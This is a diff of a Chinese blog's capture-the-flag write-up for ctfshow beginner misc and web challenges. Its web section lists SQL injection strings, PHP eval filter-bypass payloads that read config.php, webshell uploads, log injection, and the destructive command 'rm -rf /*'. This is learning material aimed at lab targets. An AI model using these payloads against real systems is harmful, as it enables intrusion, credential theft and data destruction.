 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B93/TR577_DC6Z9CP%40K_M%405W%609F.png" alt=""><br>
 通过题目描述，可以得到这些数字97，10，01，还着重说了名字小五，银行卡密码只能是数字，那就是15谐音，所以一共是97,10,01,15，银行卡密码只有6位，所以就是互相组合一下，我是直接971015，把后面的01换成15成功了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;971015&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="杂项4"><a class="header-anchor" href="#杂项4">¶</a>杂项4</h2>
+<h3 id="杂项4"><a class="header-anchor" href="#杂项4">¶</a>杂项4</h3>
 <p>下载得到一个加密压缩包，根据提示，密码为372开头的9位数字，所以我们先生成一个372000000到372999999的字典</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pd.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">372000000</span>,<span class="number">373000000</span>,<span class="number">1</span>):</span><br><span class="line">        f.write(str(i)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/IOYK~1KO%5BL%60TV2N832%5D%60K78.png" alt=""><br>
@@ -531,10 +671,23 @@ emmm…这波有点难受。</p>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/N~TU%5DY68K_7H7%60N%5B2JRQ201.png" alt=""><br>
 得到密码为372619038，所以flag为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;372619038&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="杂项5"><a class="header-anchor" href="#杂项5">¶</a>杂项5</h2>
-<p>打开题目，下载得到一个txt文件名，但没有后缀，丢进010中查看</p>
-<h1>Web</h1>
-<h2 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h2>
+<h3 id="杂项5"><a class="header-anchor" href="#杂项5">¶</a>杂项5</h3>
+<p>打开题目，下载得到一个txt文件名，但没有后缀，丢进010中查看<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/J%5D69%29X%7D%25%24F96V~%7BJ5AT3QFO.png" alt=""><br>
+发现一段文字，拿去谷歌翻译看看…<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/V4DK2Z%25P%25MXAQBPR%28UC%28SQA.png" alt=""><br>
+翻译看不出有什么有用的信息，但是注意到原文中有{}两个符号，还有F开头的大写，猜测全文的大写字母组合起来就是flag<br>
+于是写个脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-01-25 14:47:26</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = <span class="string">&quot;i was always Fond of visiting new scenes, and observing strange characters and manners. even when a mere chiLd i began my travels, and made mAny tours of discovery into foreiGn &#123;parts and unknown regions of my native City, to the frequent alarm of my parents, and The emolument of the town-crier. as i grew into boyhood, i extended the range oF my obServations. my holiday afternoons were spent in rambles about tHe surrounding cOuntry. i made myself familiar With all its places famous in history or fable. i kNew every spot where a murder or robbery had been committed, or a ghost seen. i visited the neighboring villages, and added greatly to my stock of knowledge,By noting their habits and customs, and conversing with their sages and great men.&#125;&quot;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span>((ord(i)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(i)&lt;=<span class="number">90</span>) <span class="keyword">or</span> (ord(i)==<span class="number">123</span> <span class="keyword">or</span> ord(i)==<span class="number">125</span>)):</span><br><span class="line">        result = result+i</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/0C~%7B9LK%280DUX%60WM%40ARE2S9J.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG&#123;CTFSHOWNB&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="杂项6"><a class="header-anchor" href="#杂项6">¶</a>杂项6</h3>
+<p>得到一个压缩包，题目的意思透露是伪加密，当然有些压缩软件是无视伪加密，直接就能打开，这里我直接就打开看到了flag，不过还是说说预期的做法。首先用010打开压缩包，然后把这里的09改成00再保存，即可去除伪加密<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B96/NIN%5DT%7BE8B_T4ZQX%7DBCIH5KI.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;c_t_f_s_h_o_w&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="杂项7"><a class="header-anchor" href="#杂项7">¶</a>杂项7</h3>
+<h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2>
+<h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql &#x3D; &quot;select * from article where id &#x3D; $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;!-- flag in id &#x3D; 1000 --&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br></pre></td></tr></table></figure>
 <p>这里注意到有两个条件，第一个如果传入的id大于999则报错，而注释提示我们id等于1000的时候可以查询出flag。这里我们看到括号里的判断是用的intval函数</p>
 <blockquote>
@@ -553,38 +706,38 @@ intval函数是获取变量的整型值，当它获取的变量不能被转换�
 这里也存在sql注入<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web1/~SZMD3FOJY19SPW0P%605OUNW.png" alt=""><br>
 当然省事的话直接按照他sql语句进行，取<code>?id=id--+</code>直接显示全部</p>
-<h2 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h2>
+<h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3>
 <p>接着上道题，这里题目说管理员修改了一下代码，但还是能按照上题思路解出<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web2/J0%60%7BU%60N4P9_9D%25VKCR%299_KL.png" alt=""></p>
-<h2 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h2>
+<h3 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h3>
 <p>这次多加了过滤</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
 <p>但我们依然可以利用intval函数特性进行绕过<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web3/ND%60OP54_%28EFK97T%5B451%297ZS.png" alt=""></p>
-<h2 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h2>
+<h3 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h3>
 <p>这次再面基础上又多加了select语句过滤</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
 <p>但intval函数依然存在，我们继续构造?id='1000’获取flag</p>
-<h2 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h2>
+<h3 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h3>
 <p>这次不能再使用’1000‘获取flag了</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
 <p>可以看到，这次正则表达式中匹配了单引号和双引号，再使用<code>?id='1000'</code>，单引号就会被匹配到，回显id error<br>
 但~没有被过滤，所以我们采取双重取反进行绕过，即构造<code>?id=~~1000</code>，就可获取到flag</p>
-<h2 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h2>
+<h3 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h3>
 <p>依然增加了正则表达式</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
 <p>这次看到多匹配了一个<sup>，但我们不用</sup>，我们继续使用双重取反构造获取flag：<code>?id=~~1000</code></p>
-<h2 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h2>
+<h3 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h3>
 <p>oh，no!</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>
 <p>这次它终于把<code>~</code>加到正则表达式了，我们无法使用双重取反的套路了<br>
 这次我们使用sql注入，采取<code>?id=id%23</code>进行注入，获取flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web7/D%60QTGOVBB_WRP_%28MEYRI%40%60U.png" alt=""></p>
-<h2 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h2>
+<h3 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h3>
 <p>emmm，这道题一开始我还以为是md5全相等，后面问了才知道这是个玩梗的题，即程序员离职删库跑路，命令<code>rm -rf /*</code>，Linux下强制递归删除文件。<br>
 所以构造成?flag=rm -rf /*<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web8/4QL%290H49VUPBABI8LD180%29S.png" alt=""></p>
-<h2 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h2>
+<h3 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h3>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_YDF%29_0HEIUECJ%5DF%247T4%7BAW.png" alt=""><br>
 考查eval命令执行，并且需要匹配到<strong>system|exec|highlight</strong>三个其中之一<br>
 这里使用system命令配合tac读取config.php文件<br>
@@ -594,18 +747,18 @@ intval函数是获取变量的整型值，当它获取的变量不能被转换�
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/WL%7D1TDTU%5DP%7D4Y%24202RZGM6T.png" alt=""><br>
 还可以使用exec命令，构造成<strong>?c=exec(‘tac config.php’,$res);var_dump($res);</strong><br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_3BDIKSEX%28%5DA%25QMRU~%29MT%28V.png" alt=""></p>
-<h2 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h2>
+<h3 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h3>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这次是正则匹配不允许使用，所以这里我们就不能直接使用这三个命令，可以采取命令拼接的方式构造</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web10/B_%40%40%5BP_YWOJ7FWSY%5BE%296%29CH.png" alt=""><br>
 成功获取到flag</p>
-<h2 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h2>
+<h3 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h3>
 <p>这次是在前面基础上正则匹配到cat</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>但我用的是tac，所以依然可以按照上题的解法构造，获取flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
-<h2 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h2>
+<h3 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h3>
 <p>这次居然连文件名也过滤了呜呜呜</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这波你逼我的，我们利用base64编码进行命令执行<br>
@@ -615,7 +768,7 @@ intval函数是获取变量的整型值，当它获取的变量不能被转换�
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;dGFjIGNvbmZpZy5waHA&#x3D;&quot;);$a($b);</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web12/C8BK0DY49JDXZJSGCNB%25Z%5D3.png" alt=""><br>
 成功获取到flag</p>
-<h2 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h2>
+<h3 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h3>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这次正则匹配增加了.和；符号，也就意味着我们不能再拼接执行语句了<br>
 不过还有两个命令执行函数passthru()和assert()函数</p>
@@ -633,21 +786,21 @@ assert()中如果是字符串，会将其当作php代码执行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;assert(base64_decode(&#39;c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp&#39;))?&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/H3RUCLH9F2_HW%60%249J%5BWG5UO.png" alt=""><br>
 皆可获取到flag</p>
-<h2 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h2>
+<h3 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h3>
 <p>太可恶了，这次居然连(也给匹配到了</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>不过我还有妙计，利用单引号进行绕过，构造如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac conf&#39;&#39;ig?p&#39;&#39;hp&#96;?&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web14/FI9QR%4026UGPQKOK%5BC%5DT6IN4.png" alt=""><br>
 成功获取flag</p>
-<h2 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h2>
+<h3 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h3>
 <p>阿呆又发疯了，这次把&gt;也给过滤了</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 <p>不过，这次我再给你重拳一击，用惯了get，这次我就用post打得你满地找牙，构造如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;$_POST[a]&#96;;</span><br><span class="line">post：a&#x3D;tac config.php</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web15/EPV2W%29NLVEZ%254B%7DC%40J_Z_DR.png" alt=""><br>
 获取到flag</p>
-<h2 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h2>
+<h3 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h3>
 <p>看一下代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>把这串md5去解一下<br>
@@ -655,7 +808,7 @@ assert()中如果是字符串，会将其当作php代码执行</p>
 所以我们再构造成</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;36d</span><br></pre></td></tr></table></figure>
 <p>即可获得flag</p>
-<h2 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h2>
+<h3 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h3>
 <p>打开题目，终于换一个系列了<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/8Z9%29%28_5UFERE%5DI6BQXG9%60PN.png" alt=""><br>
 把php都过滤了QWQ，抓包看看<br>
@@ -669,9 +822,9 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/AA88TO%5BG%60%5BRE3%25CRTCQQPRV.png" alt=""><br>
 连接成功后，再36d.php文件中找到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/TZ83A0AQ%2821%407%5D~%40C%60%295ZTS.png" alt=""></p>
-<h2 id="web18-21"><a class="header-anchor" href="#web18-21">¶</a>web18-21</h2>
+<h3 id="web18-21"><a class="header-anchor" href="#web18-21">¶</a>web18-21</h3>
 <p>使用web17的方法都可以解决</p>
-<h2 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h2>
+<h3 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h3>
 <p>打开环境，发现这次会在后面自动加上.php结尾<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/O%29LZC%5B%24T%408RQ3GU2WJ%4001GO.png" alt=""><br>
 然后这次用日志注入的话也行不通，可能给的权限不够了，所以我们另寻出路<br>
@@ -694,7 +847,7 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/~%28IZ5SOVV%25O4TM%24D%28SIFW7C.png" alt=""><br>
 那我们直接把shell.php直接改成<code>tac 36d.php</code>，然后就能拿到flag了<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/J%24RG%7DA~%5B6G8PHJY5J~8S9U0.png" alt=""></p>
-<h2 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h2>
+<h3 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h3>
 <p>打开网站，发现是文件上传<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/76A%2573%5D%606L7W%280%7BW6_JC72S.png" alt=""><br>
 直接抓包传个一句话木马试试<br>
@@ -707,8 +860,26 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
 看到目录下有flaghere0.txt，我们把源码中的<code>ls ../</code>改成<code>tac ../flaghere0.txt</code>即可，然后再运行一遍<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/%7DYAD%7BR7%245%7BTWMS3O%40AN6431.png" alt=""><br>
 得到flag😎</p>
-<h2 id="web-24"><a class="header-anchor" href="#web-24">¶</a>web 24</h2>
+<h3 id="web-24"><a class="header-anchor" href="#web-24">¶</a>web 24</h3>
 <p>按照题目提示把源码中的随机数改成(0,300)，时间改成3即可，运行得到flag</p>
+<h3 id="获得百分之百的快乐"><a class="header-anchor" href="#获得百分之百的快乐">¶</a>获得百分之百的快乐</h3>
+<p>打开题目源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br><span class="line"><span class="comment">//by Firebasky </span></span><br></pre></td></tr></table></figure>
+<p>限制长度为4以下的命令执行，我们先构成<code>?1=ls</code>查看一下有什么文件<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/EO%60%5BGUYLPTKYUYEWAL4E%289D.png" alt=""><br>
+发现文件名有s和z开头的，想到最短的命令就是nl命令，nl可以输出文件内容和行号，那只有三个字符长度如何读取secretsecret_ctfshow_36dddddddddd.php中得flag呢？<br>
+我们先去kali走一遍，说说原理：<br>
+首先使用&gt;可以生成一个文件，我们这里使用<code>&gt;s</code>生成一个空的文件名为s的文件<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/0%5BVI%6065%7BCX434Q_~DFS893O.png" alt=""><br>
+然后往s中写入abc三个字符后，使用<code>nl s</code>输出试试，输出结果为带行号的s文件内容<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/Y8AL~V%7BFZQ5%25%5B%7B8R5R6Y%243U.png" alt=""><br>
+我们再使用<code>&gt;nl</code>生成nl为文件名的文件，然后使用<code>*</code>通配符<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/ME%25%28LK%256E%60Q%7BN_LGN2J3_JV.png" alt=""><br>
+发现会把abc的文件内容也读取成功了，这是因为*会把ls出来的一串文件名按ls的顺序读取成一个字符串，然后当做命令执行，也就变成了&quot;nl s&quot;，变成了一个nl命令<br>
+所以这道题的pyload为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br><span class="line">#还有另一个命令od（八进制输出）也是可以的</span><br></pre></td></tr></table></figure>
+<p>然后再源码中就可以看到flag了<br>
